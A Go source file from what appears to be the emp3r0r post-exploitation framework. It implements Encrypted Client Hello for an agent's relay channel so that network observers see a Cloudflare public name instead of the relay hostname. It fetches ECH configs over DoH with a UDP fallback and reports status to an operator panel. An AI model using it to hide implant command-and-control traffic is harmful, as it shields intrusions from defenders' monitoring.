// Package transport — ech_client.go
//
// Client-side ECH (Encrypted Client Hello) for the relay channel. The
// OUTER ClientHello — the only part a passive observer can read — carries
// the ECH public name (cloudflare-ech.com for CF zones) instead of our
// relay hostname, while the HPKE-encrypted INNER keeps the real SNI. This
// closes the last plaintext leak the channel had.
//
// Flow: the agent fetches the ECHConfigList from the DNS HTTPS (type 65)
// record of its relay host via DoH (the relay Worker's own /dns route),
// caches it (TTL = record TTL, capped), and browserTLSConnect hands it to
// uTLS whenever a fresh config is available. On rejection (config rotated,
// middlebox RSTs ECH) ECH is disabled for a few minutes and the connection
// falls back to plain SNI, while a background refresh re-arms it.
package transport

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/miekg/dns"
)

// ---------------------------------------------------------------------------
// ECHConfig parsing (draft-ietf-tls-esni-18)
// ---------------------------------------------------------------------------

// echPublicNameOf parses the public name out of the first usable ECHConfig
// of an ECHConfigList. Layout per config:
//
//	version(2) length(2) config_id(1) kem_id(2) public_key(2+len)
//	cipher_suites(2+n*4) max_name_len(1) public_name(1+len) extensions(2+n)
func echPublicNameOf(echConfigList []byte) (string, error) {
	if len(echConfigList) < 2 {
		return "", fmt.Errorf("ech: empty config list")
	}
	listLen := int(binary.BigEndian.Uint16(echConfigList))
	rest := echConfigList[2:]
	if listLen > len(rest) {
		return "", fmt.Errorf("ech: config list truncated")
	}
	rest = rest[:listLen]
	for len(rest) >= 4 {
		version := binary.BigEndian.Uint16(rest)
		cfgLen := int(binary.BigEndian.Uint16(rest[2:]))
		if len(rest) < 4+cfgLen {
			return "", fmt.Errorf("ech: config truncated")
		}
		cfg := rest[4 : 4+cfgLen]
		rest = rest[4+cfgLen:]
		if version != 0xfe0d { // draft-17/18 ECH
			continue
		}
		name, err := parseECHPublicName(cfg)
		if err != nil {
			continue
		}
		return name, nil
	}
	return "", fmt.Errorf("ech: no parseable config")
}

func parseECHPublicName(cfg []byte) (string, error) {
	// config_id(1) kem_id(2)
	if len(cfg) < 3 {
		return "", fmt.Errorf("short")
	}
	rest := cfg[3:]
	// public_key: 2-byte length prefix
	if len(rest) < 2 {
		return "", fmt.Errorf("short key len")
	}
	kl := int(binary.BigEndian.Uint16(rest))
	rest = rest[2:]
	if len(rest) < kl {
		return "", fmt.Errorf("short key")
	}
	rest = rest[kl:]
	// cipher_suites: 2-byte length prefix
	if len(rest) < 2 {
		return "", fmt.Errorf("short suites len")
	}
	sl := int(binary.BigEndian.Uint16(rest))
	rest = rest[2:]
	if len(rest) < sl {
		return "", fmt.Errorf("short suites")
	}
	rest = rest[sl:]
	// max_name_length(1)
	if len(rest) < 1 {
		return "", fmt.Errorf("short max name len")
	}
	rest = rest[1:]
	// public_name: 1-byte length prefix
	if len(rest) < 1 {
		return "", fmt.Errorf("short name len")
	}
	nl := int(rest[0])
	if len(rest) < 1+nl {
		return "", fmt.Errorf("short name")
	}
	return string(rest[1 : 1+nl]), nil
}

// ---------------------------------------------------------------------------
// Config cache + DoH endpoint
// ---------------------------------------------------------------------------

// echEntry is a cached ECHConfigList for one relay host.
type echEntry struct {
	list       []byte
	publicName string
	expires    time.Time
	disabledTo time.Time // ECH failed recently — plain SNI until then
}

var (
	echMu      sync.Mutex
	echCache   = map[string]*echEntry{}
	dohMu      sync.RWMutex
	dohURL     string // last DoH endpoint the agent installed

	// ECH observability: a silent degradation (middlebox starts RSTing ECH
	// ClientHellos and we fall back to plain SNI) must be VISIBLE to the
	// operator, not just logged on the agent. The status rides checkin as
	// def.Emp3r0rAgent.ECHStatus and surfaces as a badge in the panel.
	echStatusMu     sync.Mutex
	echStatusHosts  = map[string]string{} // host -> armed | degraded | off
	echStatusReason = map[string]string{} // host -> last degradation reason
)

func setECHStatus(host, status, reason string) {
	echStatusMu.Lock()
	defer echStatusMu.Unlock()
	echStatusHosts[host] = status
	if reason != "" {
		echStatusReason[host] = reason
	} else if status == "armed" {
		delete(echStatusReason, host)
	}
}

// ECHStatus aggregates the per-host ECH state for checkin reporting.
// armed wins over degraded wins over off; empty when ECH was never
// attempted for any host.
func ECHStatus() string {
	echStatusMu.Lock()
	defer echStatusMu.Unlock()
	best, bestReason := "", ""
	rank := map[string]int{"armed": 3, "degraded": 2, "off": 1}
	for host, st := range echStatusHosts {
		if rank[st] > rank[best] {
			best = st
			bestReason = echStatusReason[host]
		}
	}
	if best == "" {
		return ""
	}
	if bestReason != "" {
		return best + " (" + bestReason + ")"
	}
	return best
}

// SetDoHEndpoint records the agent's DoH URL so background ECH refreshes
// know where to query. Called when the agent (re)installs its resolver.
func SetDoHEndpoint(url string) {
	dohMu.Lock()
	dohURL = url
	dohMu.Unlock()
}

func getDoHEndpoint() string {
	dohMu.RLock()
	defer dohMu.RUnlock()
	return dohURL
}

// echUsable returns the cached entry when ECH should be attempted: config
// present, not expired-stale beyond recovery, and not in a disable window.
func echUsable(host string) *echEntry {
	echMu.Lock()
	defer echMu.Unlock()
	e := echCache[host]
	if e == nil || len(e.list) == 0 {
		return nil
	}
	now := time.Now()
	if now.Before(e.disabledTo) {
		return nil
	}
	return e
}

func echDisable(host string, d time.Duration) {
	echMu.Lock()
	defer echMu.Unlock()
	if e := echCache[host]; e != nil {
		e.disabledTo = time.Now().Add(d)
	}
}

func echStore(host string, list []byte, publicName string, ttl time.Duration) {
	echMu.Lock()
	defer echMu.Unlock()
	echCache[host] = &echEntry{list: list, publicName: publicName, expires: time.Now().Add(ttl)}
}

// ---------------------------------------------------------------------------
// HTTPS record fetch over DoH
// ---------------------------------------------------------------------------

// RefreshECHConfig queries the DNS HTTPS (type 65) record for host through
// the given DoH endpoint (RFC 8484 POST), extracts the ech= param and
// caches the ECHConfigList. Returns true when ECH is now armed for host.
//
// The fetch connection itself uses plain SNI (chicken-and-egg: the config
// needed for ECH lives behind this very query) — one visible SNI per
// process start, everything after is masked.
func RefreshECHConfig(doh, host string) bool {
	if doh == "" || host == "" {
		return false
	}
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(host), dns.TypeHTTPS)
	m.RecursionDesired = true
	wire, err := m.Pack()
	if err != nil {
		return false
	}
	secret := ""
	if u, uerr := url.Parse(doh); uerr == nil {
		secret = u.Query().Get("secret")
	}
	// browser-dressed POST: secret via the Authorization header, never the
	// URL query (which ends up in access logs)
	body, err := DoHPost(DoHHTTPClient(nil), doh, secret, wire)
	if err != nil {
		// DoH endpoint down/blocked: fall back to a plain UDP resolver before
		// giving up — ECH hiding the relay SNI is worth one extra query.
		if body, err = dnsQueryUDP(host); err == nil {
			logging.Infof("ech: DoH failed (%v), fetched HTTPS record via UDP resolver", err)
		} else {
			setECHStatus(host, "off", "ech config fetch failed: "+err.Error())
			return false
		}
	}
	answer := new(dns.Msg)
	if err := answer.Unpack(body); err != nil {
		setECHStatus(host, "off", "ech config parse failed")
		return false
	}
	for _, rr := range answer.Answer {
		https, ok := rr.(*dns.HTTPS)
		if !ok {
			continue
		}
		for _, kv := range https.Value {
			ech, ok := kv.(*dns.SVCBECHConfig)
			if !ok || len(ech.ECH) == 0 {
				continue
			}
			publicName, err := echPublicNameOf(ech.ECH)
			if err != nil {
				continue
			}
			ttl := time.Duration(https.Header().Ttl) * time.Second
			if ttl <= 0 || ttl > time.Hour {
				ttl = time.Hour
			}
			echStore(host, ech.ECH, publicName, ttl)
			return true
		}
	}
	setECHStatus(host, "off", "no ech= in HTTPS record")
	return false
}

// refreshECHBackground re-queries the config for host (using the recorded
// DoH endpoint) and clears the disable window on success — used to re-arm
// ECH after a rejection (e.g. CF rotated the config).
func refreshECHBackground(host string) {
	doh := getDoHEndpoint()
	if doh == "" {
		return
	}
	go RefreshECHConfig(doh, host)
}

// dnsReadSystemResolvers extracts the nameservers from /etc/resolv.conf,
// falling back to a public resolver list when parsing fails.
func dnsReadSystemResolvers() []string {
	data, err := os.ReadFile("/etc/resolv.conf")
	var servers []string
	if err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "nameserver ") {
				ns := strings.TrimSpace(strings.TrimPrefix(line, "nameserver "))
				if ns != "" {
					servers = append(servers, ns)
				}
			}
		}
	}
	if len(servers) == 0 {
		servers = []string{"1.1.1.1", "8.8.8.8"}
	}
	return servers
}

// dnsQueryUDP asks the system resolvers (UDP 53) for the HTTPS record of
// host — the ECH-config fallback when every DoH path is unavailable.
func dnsQueryUDP(host string) ([]byte, error) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(host), dns.TypeHTTPS)
	m.RecursionDesired = true
	client := new(dns.Client)
	client.Net = "udp"
	client.Timeout = 5 * time.Second
	servers := dnsReadSystemResolvers()
	var lastErr error
	for _, server := range servers {
		resp, _, err := client.Exchange(m, net.JoinHostPort(server, "53"))
		if err != nil {
			lastErr = err
			continue
		}
		return resp.Pack()
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no system resolver available")
	}
	return nil, lastErr
}

// ECHProbeConnect dials + handshakes with real ECH for host, for tests and
// diagnostics. Dial failure and handshake failure are both returned as-is.
func ECHProbeConnect(dial func() (net.Conn, error), hostport string) (net.Conn, error) {
	return tlsConnectOnce(dial, hostport, false)
}
